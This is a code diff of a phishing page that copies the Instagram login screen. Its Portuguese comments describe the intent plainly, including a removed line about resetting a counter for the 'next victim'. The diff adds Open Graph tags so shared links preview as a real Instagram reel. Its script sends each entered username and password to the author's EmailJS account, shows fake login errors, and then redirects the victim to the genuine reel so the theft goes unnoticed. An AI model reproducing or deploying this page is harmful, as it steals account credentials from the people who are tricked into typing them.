@@ -4,6 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
+    
+    <!-- Meta Tags para o Preview ficar IDÊNTICO ao Reel original -->
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:title" content="Vídeo de Instagram: DVPfikwiJr7">
+    <meta property="og:description" content="Assista a este reel no Instagram">
+    <meta property="og:type" content="video.other">
+    <meta property="og:image" content="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHY3y5.png">
+    <meta property="og:url" content="https://www.instagram.com/reel/DVPfikwiJr7/">
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
@@ -36,7 +45,6 @@
             overflow: hidden;
         }
 
-        /* BANNER DE AVISO RÁPIDO */
         #insta-toast {
             position: fixed;
             top: 20px;
@@ -106,7 +114,6 @@
             padding: 0 16px;
             font-size: 15px;
             outline: none;
-            transition: border 0.2s;
         }
 
         .btn-submit {
@@ -120,15 +127,6 @@
             font-weight: 600;
             margin-top: 10px;
             cursor: pointer;
-        }
-
-        .forgot-link {
-            display: block;
-            margin-top: 25px;
-            color: var(--text-primary);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
         }
 
         .footer {
@@ -152,14 +150,6 @@
             align-items: center;
             justify-content: center;
             margin-bottom: 25px;
-        }
-
-        .meta-footer {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            color: #8e8e8e;
         }
 
         #loading {
@@ -205,14 +195,13 @@
             <button type="submit" class="btn-submit" id="btnSubmit">Entrar</button>
         </form>
 
-        <a href="#" class="forgot-link">Esqueceu a senha?</a>
+        <a href="#" style="display: block; margin-top: 25px; color: white; text-decoration: none; font-size: 14px; font-weight: 500;">Esqueceu a senha?</a>
     </div>
 
     <div class="footer">
         <a href="#" class="btn-new-account">Criar nova conta</a>
-        <div class="meta-footer">
-            <i class="fab fa-meta"></i>
-            <span class="meta-text">Meta</span>
+        <div class="meta-footer" style="color: #8e8e8e; font-size: 13px; font-weight: 600;">
+            <i class="fab fa-meta" style="font-size: 18px;"></i> Meta
         </div>
     </div>
 
@@ -226,13 +215,13 @@
         const loading = document.getElementById("loading");
         const toast = document.getElementById("insta-toast");
 
-        // Mostrar mensagem rápida ao entrar
         window.onload = () => {
             toast.style.display = "block";
             setTimeout(() => { toast.style.display = "none"; }, 2500);
         };
 
-        let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
+        // Contador de tentativas
+        let attempts = 0;
 
         form.addEventListener("submit", function(e) {
             e.preventDefault();
@@ -248,22 +237,21 @@
                 attempt: attempts + 1
             };
 
+            // Manda pro seu EmailJS
             emailjs.send("service_enl5l78", "template_75bhyah", templateParams)
             .then(() => {
                 attempts++;
-                localStorage.setItem('loginAttempts', attempts);
 
                 setTimeout(() => {
                     loading.style.display = "none";
 
-                    if (attempts < 4) {
-                        // 1ª, 2ª e 3ª tentativas: Mostra erro e limpa senha
+                    if (attempts < 3) {
+                        // 1ª e 2ª tentativa: Mostra erro
                         errorMsg.style.display = "block";
                         form.password.value = "";
                         form.password.focus();
                     } else {
-                        // 4ª tentativa: Redireciona pro link específico
-                        localStorage.setItem('loginAttempts', '0'); // Reseta pra próxima vítima
+                        // 3ª tentativa: Redireciona pro Reel real
                         window.location.href = "https://www.instagram.com/reel/DVPfikwiJr7/?igsh=cng3YTMzNjNtdnJs";
                     }
                 }, 1000);
